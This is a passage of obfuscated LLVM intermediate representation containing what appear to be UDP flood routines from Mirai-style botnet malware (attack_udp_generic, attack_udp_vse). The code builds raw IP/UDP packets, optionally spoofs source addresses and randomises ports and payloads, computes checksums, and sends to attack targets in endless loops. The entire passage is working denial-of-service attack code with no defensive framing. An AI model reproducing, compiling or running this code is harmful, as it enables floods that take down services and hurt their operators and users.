  %829 = load i32, i32* %9, align 4
  %830 = sext i32 %829 to i64
  %831 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %828, i64 %830
  %832 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %831, i32 0, i32 0
  %833 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %832, i32 0, i32 1
  store i16 %827, i16* %833, align 2
  %834 = load i32, i32* %10, align 4
  %835 = load i8*, i8** %39, align 8
  %836 = load i32, i32* %24, align 4
  %837 = sext i32 %836 to i64
  %838 = sub i64 0, 40
  %839 = sub i64 0, %837
  %840 = add i64 %838, %839
  %841 = sub i64 0, %840
  %842 = add i64 40, %837
  %843 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %844 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %845 = load i32, i32* %9, align 4
  %846 = sext i32 %845 to i64
  %847 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %844, i64 %846
  %848 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %847, i32 0, i32 0
  %849 = bitcast %struct.sockaddr_in* %848 to %struct.sockaddr*
  store %struct.sockaddr* %849, %struct.sockaddr** %843, align 8
  %850 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %851 = load %struct.sockaddr*, %struct.sockaddr** %850, align 8
  %852 = call i64 @sendto(i32 %834, i8* %835, i64 %841, i32 16384, %struct.sockaddr* %851, i32 16)
  br label %853

; <label>:853:                                    ; preds = %768
  %854 = load i32, i32* %9, align 4
  %855 = sub i32 %854, 491909540
  %856 = add i32 %855, 1
  %857 = add i32 %856, 491909540
  %858 = add nsw i32 %854, 1
  store i32 %857, i32* %9, align 4
  br label %731

; <label>:859:                                    ; preds = %731
  br label %730

; <label>:860:                                    ; preds = %210, %111, %105
  ret void
}

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #6
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 512)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  %70 = icmp sgt i32 %69, 1460
  br i1 %70, label %71, label %72

; <label>:71:                                     ; preds = %4
  store i16 1460, i16* %18, align 2
  br label %72

; <label>:72:                                     ; preds = %71, %4
  %73 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %73, i32* %10, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %76

; <label>:75:                                     ; preds = %72
  br label %374

; <label>:76:                                     ; preds = %72
  store i32 1, i32* %9, align 4
  %77 = load i32, i32* %10, align 4
  %78 = bitcast i32* %9 to i8*
  %79 = call i32 @setsockopt(i32 %77, i32 0, i32 3, i8* %78, i32 4) #6
  %80 = icmp eq i32 %79, -1
  br i1 %80, label %81, label %84

; <label>:81:                                     ; preds = %76
  %82 = load i32, i32* %10, align 4
  %83 = call i32 @close(i32 %82)
  br label %374

; <label>:84:                                     ; preds = %76
  store i32 0, i32* %9, align 4
  br label %85

; <label>:85:                                     ; preds = %215, %84
  %86 = load i32, i32* %9, align 4
  %87 = load i8, i8* %5, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp slt i32 %86, %88
  br i1 %89, label %90, label %221

; <label>:90:                                     ; preds = %85
  %91 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %92 = load i8**, i8*** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8*, i8** %92, i64 %94
  store i8* %91, i8** %95, align 8
  %96 = load i8**, i8*** %11, align 8
  %97 = load i32, i32* %9, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8*, i8** %96, i64 %98
  %100 = load i8*, i8** %99, align 8
  %101 = bitcast i8* %100 to %struct.iphdr*
  store %struct.iphdr* %101, %struct.iphdr** %21, align 8
  %102 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %103 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %102, i64 1
  %104 = bitcast %struct.iphdr* %103 to %struct.udphdr*
  store %struct.udphdr* %104, %struct.udphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %106 = bitcast %struct.iphdr* %105 to i8*
  %107 = load i8, i8* %106, align 4
  %108 = xor i8 15, -1
  %109 = xor i8 %107, %108
  %110 = and i8 %109, %107
  %111 = and i8 %107, 15
  %112 = xor i8 %110, -1
  %113 = xor i8 64, -1
  %114 = xor i8 -51, -1
  %115 = and i8 %112, -51
  %116 = and i8 %110, %114
  %117 = and i8 %113, -51
  %118 = and i8 64, %114
  %119 = or i8 %115, %116
  %120 = or i8 %117, %118
  %121 = xor i8 %119, %120
  %122 = or i8 %112, %113
  %123 = xor i8 %122, -1
  %124 = or i8 -51, %114
  %125 = and i8 %123, %124
  %126 = or i8 %121, %125
  %127 = or i8 %110, 64
  store i8 %126, i8* %106, align 4
  %128 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %129 = bitcast %struct.iphdr* %128 to i8*
  %130 = load i8, i8* %129, align 4
  %131 = xor i8 %130, -1
  %132 = xor i8 -16, -1
  %133 = xor i8 -128, -1
  %134 = or i8 %131, %132
  %135 = or i8 -128, %133
  %136 = xor i8 %134, -1
  %137 = and i8 %136, %135
  %138 = and i8 %130, -16
  %139 = xor i8 %137, -1
  %140 = xor i8 5, -1
  %141 = xor i8 5, -1
  %142 = and i8 %139, 5
  %143 = and i8 %137, %141
  %144 = and i8 %140, 5
  %145 = and i8 5, %141
  %146 = or i8 %142, %143
  %147 = or i8 %144, %145
  %148 = xor i8 %146, %147
  %149 = or i8 %139, %140
  %150 = xor i8 %149, -1
  %151 = or i8 5, %141
  %152 = and i8 %150, %151
  %153 = or i8 %148, %152
  %154 = or i8 %137, 5
  store i8 %153, i8* %129, align 4
  %155 = load i8, i8* %12, align 1
  %156 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 1
  store i8 %155, i8* %157, align 1
  %158 = load i16, i16* %18, align 2
  %159 = zext i16 %158 to i64
  %160 = sub i64 0, 28
  %161 = sub i64 0, %159
  %162 = add i64 %160, %161
  %163 = sub i64 0, %162
  %164 = add i64 28, %159
  %165 = trunc i64 %163 to i16
  %166 = call zeroext i16 @htons(i16 zeroext %165) #7
  %167 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 2
  store i16 %166, i16* %168, align 2
  %169 = load i16, i16* %13, align 2
  %170 = call zeroext i16 @htons(i16 zeroext %169) #7
  %171 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 3
  store i16 %170, i16* %172, align 4
  %173 = load i8, i8* %14, align 1
  %174 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 5
  store i8 %173, i8* %175, align 4
  %176 = load i8, i8* %15, align 1
  %177 = icmp ne i8 %176, 0
  br i1 %177, label %178, label %182

; <label>:178:                                    ; preds = %90
  %179 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %180 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 4
  store i16 %179, i16* %181, align 2
  br label %182

; <label>:182:                                    ; preds = %178, %90
  %183 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 6
  store i8 17, i8* %184, align 1
  %185 = load i32, i32* %20, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 8
  store i32 %185, i32* %187, align 4
  %188 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %189 = load i32, i32* %9, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %188, i64 %190
  %192 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %191, i32 0, i32 1
  %193 = load i32, i32* %192, align 4
  %194 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 9
  store i32 %193, i32* %195, align 4
  %196 = load i16, i16* %16, align 2
  %197 = call zeroext i16 @htons(i16 zeroext %196) #7
  %198 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %199 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %198, i32 0, i32 0
  store i16 %197, i16* %199, align 2
  %200 = load i16, i16* %17, align 2
  %201 = call zeroext i16 @htons(i16 zeroext %200) #7
  %202 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %203 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %202, i32 0, i32 1
  store i16 %201, i16* %203, align 2
  %204 = load i16, i16* %18, align 2
  %205 = zext i16 %204 to i64
  %206 = sub i64 0, 8
  %207 = sub i64 0, %205
  %208 = add i64 %206, %207
  %209 = sub i64 0, %208
  %210 = add i64 8, %205
  %211 = trunc i64 %209 to i16
  %212 = call zeroext i16 @htons(i16 zeroext %211) #7
  %213 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %214 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %213, i32 0, i32 2
  store i16 %212, i16* %214, align 2
  br label %215

; <label>:215:                                    ; preds = %182
  %216 = load i32, i32* %9, align 4
  %217 = add i32 %216, 967165285
  %218 = add i32 %217, 1
  %219 = sub i32 %218, 967165285
  %220 = add nsw i32 %216, 1
  store i32 %219, i32* %9, align 4
  br label %85

; <label>:221:                                    ; preds = %85
  br label %222

; <label>:222:                                    ; preds = %373, %221
  store i32 0, i32* %9, align 4
  br label %223

; <label>:223:                                    ; preds = %368, %222
  %224 = load i32, i32* %9, align 4
  %225 = load i8, i8* %5, align 1
  %226 = zext i8 %225 to i32
  %227 = icmp slt i32 %224, %226
  br i1 %227, label %228, label %373

; <label>:228:                                    ; preds = %223
  %229 = load i8**, i8*** %11, align 8
  %230 = load i32, i32* %9, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds i8*, i8** %229, i64 %231
  %233 = load i8*, i8** %232, align 8
  store i8* %233, i8** %23, align 8
  %234 = load i8*, i8** %23, align 8
  %235 = bitcast i8* %234 to %struct.iphdr*
  store %struct.iphdr* %235, %struct.iphdr** %24, align 8
  %236 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i64 1
  %238 = bitcast %struct.iphdr* %237 to %struct.udphdr*
  store %struct.udphdr* %238, %struct.udphdr** %25, align 8
  %239 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %240 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %239, i64 1
  %241 = bitcast %struct.udphdr* %240 to i8*
  store i8* %241, i8** %26, align 8
  %242 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %243 = load i32, i32* %9, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %242, i64 %244
  %246 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %245, i32 0, i32 2
  %247 = load i8, i8* %246, align 4
  %248 = zext i8 %247 to i32
  %249 = icmp slt i32 %248, 32
  br i1 %249, label %250, label %274

; <label>:250:                                    ; preds = %228
  %251 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %252 = load i32, i32* %9, align 4
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %251, i64 %253
  %255 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %254, i32 0, i32 1
  %256 = load i32, i32* %255, align 4
  %257 = call i32 @ntohl(i32 %256) #7
  %258 = call i32 @rand_next()
  %259 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %260 = load i32, i32* %9, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %259, i64 %261
  %263 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %262, i32 0, i32 2
  %264 = load i8, i8* %263, align 4
  %265 = zext i8 %264 to i32
  %266 = lshr i32 %258, %265
  %267 = add i32 %257, -282775832
  %268 = add i32 %267, %266
  %269 = sub i32 %268, -282775832
  %270 = add i32 %257, %266
  %271 = call i32 @htonl(i32 %269) #7
  %272 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %273 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %272, i32 0, i32 9
  store i32 %271, i32* %273, align 4
  br label %274

; <label>:274:                                    ; preds = %250, %228
  %275 = load i32, i32* %20, align 4
  %276 = icmp eq i32 %275, -1
  br i1 %276, label %277, label %281

; <label>:277:                                    ; preds = %274
  %278 = call i32 @rand_next()
  %279 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 8
  store i32 %278, i32* %280, align 4
  br label %281

; <label>:281:                                    ; preds = %277, %274
  %282 = load i16, i16* %13, align 2
  %283 = zext i16 %282 to i32
  %284 = icmp eq i32 %283, 65535
  br i1 %284, label %285, label %290

; <label>:285:                                    ; preds = %281
  %286 = call i32 @rand_next()
  %287 = trunc i32 %286 to i16
  %288 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 3
  store i16 %287, i16* %289, align 4
  br label %290

; <label>:290:                                    ; preds = %285, %281
  %291 = load i16, i16* %16, align 2
  %292 = zext i16 %291 to i32
  %293 = icmp eq i32 %292, 65535
  br i1 %293, label %294, label %299

; <label>:294:                                    ; preds = %290
  %295 = call i32 @rand_next()
  %296 = trunc i32 %295 to i16
  %297 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %298 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %297, i32 0, i32 0
  store i16 %296, i16* %298, align 2
  br label %299

; <label>:299:                                    ; preds = %294, %290
  %300 = load i16, i16* %17, align 2
  %301 = zext i16 %300 to i32
  %302 = icmp eq i32 %301, 65535
  br i1 %302, label %303, label %308

; <label>:303:                                    ; preds = %299
  %304 = call i32 @rand_next()
  %305 = trunc i32 %304 to i16
  %306 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %307 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %306, i32 0, i32 1
  store i16 %305, i16* %307, align 2
  br label %308

; <label>:308:                                    ; preds = %303, %299
  %309 = load i8, i8* %19, align 1
  %310 = icmp ne i8 %309, 0
  br i1 %310, label %311, label %315

; <label>:311:                                    ; preds = %308
  %312 = load i8*, i8** %26, align 8
  %313 = load i16, i16* %18, align 2
  %314 = zext i16 %313 to i32
  call void @rand_str(i8* %312, i32 %314)
  br label %315

; <label>:315:                                    ; preds = %311, %308
  %316 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %317 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %316, i32 0, i32 7
  store i16 0, i16* %317, align 2
  %318 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %319 = bitcast %struct.iphdr* %318 to i16*
  %320 = call zeroext i16 @checksum_generic(i16* %319, i32 20)
  %321 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %322 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %321, i32 0, i32 7
  store i16 %320, i16* %322, align 2
  %323 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %324 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %323, i32 0, i32 3
  store i16 0, i16* %324, align 2
  %325 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %326 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %327 = bitcast %struct.udphdr* %326 to i8*
  %328 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %329 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %328, i32 0, i32 2
  %330 = load i16, i16* %329, align 2
  %331 = load i16, i16* %18, align 2
  %332 = zext i16 %331 to i64
  %333 = add i64 8, -7354492904114923759
  %334 = add i64 %333, %332
  %335 = sub i64 %334, -7354492904114923759
  %336 = add i64 8, %332
  %337 = trunc i64 %335 to i32
  %338 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %325, i8* %327, i16 zeroext %330, i32 %337)
  %339 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %340 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %339, i32 0, i32 3
  store i16 %338, i16* %340, align 2
  %341 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %342 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %341, i32 0, i32 1
  %343 = load i16, i16* %342, align 2
  %344 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %345 = load i32, i32* %9, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %344, i64 %346
  %348 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %347, i32 0, i32 0
  %349 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %348, i32 0, i32 1
  store i16 %343, i16* %349, align 2
  %350 = load i32, i32* %10, align 4
  %351 = load i8*, i8** %23, align 8
  %352 = load i16, i16* %18, align 2
  %353 = zext i16 %352 to i64
  %354 = sub i64 28, 6920763925627604170
  %355 = add i64 %354, %353
  %356 = add i64 %355, 6920763925627604170
  %357 = add i64 28, %353
  %358 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %359 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %360 = load i32, i32* %9, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %359, i64 %361
  %363 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %362, i32 0, i32 0
  %364 = bitcast %struct.sockaddr_in* %363 to %struct.sockaddr*
  store %struct.sockaddr* %364, %struct.sockaddr** %358, align 8
  %365 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %366 = load %struct.sockaddr*, %struct.sockaddr** %365, align 8
  %367 = call i64 @sendto(i32 %350, i8* %351, i64 %356, i32 16384, %struct.sockaddr* %366, i32 16)
  br label %368

; <label>:368:                                    ; preds = %315
  %369 = load i32, i32* %9, align 4
  %370 = sub i32 0, 1
  %371 = sub i32 %369, %370
  %372 = add nsw i32 %369, 1
  store i32 %371, i32* %9, align 4
  br label %223

; <label>:373:                                    ; preds = %223
  br label %222

; <label>:374:                                    ; preds = %81, %75
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #6
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 29)
  %55 = call i8* @table_retrieve_val(i32 29, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %56, i32* %10, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %4
  br label %328

; <label>:59:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %60 = load i32, i32* %10, align 4
  %61 = bitcast i32* %9 to i8*
  %62 = call i32 @setsockopt(i32 %60, i32 0, i32 3, i8* %61, i32 4) #6
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %64, label %67

; <label>:64:                                     ; preds = %59
  %65 = load i32, i32* %10, align 4
  %66 = call i32 @close(i32 %65)
  br label %328

; <label>:67:                                     ; preds = %59
  store i32 0, i32* %9, align 4
  br label %68

; <label>:68:                                     ; preds = %185, %67
  %69 = load i32, i32* %9, align 4
  %70 = load i8, i8* %5, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %69, %71
  br i1 %72, label %73, label %191

; <label>:73:                                     ; preds = %68
  %74 = call noalias i8* @calloc(i64 128, i64 1) #6
  %75 = load i8**, i8*** %11, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8*, i8** %75, i64 %77
  store i8* %74, i8** %78, align 8
  %79 = load i8**, i8*** %11, align 8
  %80 = load i32, i32* %9, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8*, i8** %79, i64 %81
  %83 = load i8*, i8** %82, align 8
  %84 = bitcast i8* %83 to %struct.iphdr*
  store %struct.iphdr* %84, %struct.iphdr** %20, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i64 1
  %87 = bitcast %struct.iphdr* %86 to %struct.udphdr*
  store %struct.udphdr* %87, %struct.udphdr** %21, align 8
  %88 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %89 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %88, i64 1
  %90 = bitcast %struct.udphdr* %89 to i8*
  store i8* %90, i8** %22, align 8
  %91 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %92 = bitcast %struct.iphdr* %91 to i8*
  %93 = load i8, i8* %92, align 4
  %94 = xor i8 %93, -1
  %95 = xor i8 15, -1
  %96 = xor i8 100, -1
  %97 = or i8 %94, %95
  %98 = or i8 100, %96
  %99 = xor i8 %97, -1
  %100 = and i8 %99, %98
  %101 = and i8 %93, 15
  %102 = and i8 %100, 64
  %103 = xor i8 %100, 64
  %104 = or i8 %102, %103
  %105 = or i8 %100, 64
  store i8 %104, i8* %92, align 4
  %106 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %107 = bitcast %struct.iphdr* %106 to i8*
  %108 = load i8, i8* %107, align 4
  %109 = xor i8 %108, -1
  %110 = xor i8 -16, -1
  %111 = xor i8 120, -1
  %112 = or i8 %109, %110
  %113 = or i8 120, %111
  %114 = xor i8 %112, -1
  %115 = and i8 %114, %113
  %116 = and i8 %108, -16
  %117 = and i8 %115, 5
  %118 = xor i8 %115, 5
  %119 = or i8 %117, %118
  %120 = or i8 %115, 5
  store i8 %119, i8* %107, align 4
  %121 = load i8, i8* %12, align 1
  %122 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i32 0, i32 1
  store i8 %121, i8* %123, align 1
  %124 = load i32, i32* %19, align 4
  %125 = sext i32 %124 to i64
  %126 = sub i64 0, %125
  %127 = sub i64 32, %126
  %128 = add i64 32, %125
  %129 = trunc i64 %127 to i16
  %130 = call zeroext i16 @htons(i16 zeroext %129) #7
  %131 = load %struct.iphdr*, %struct.iphdr** %20, align 8
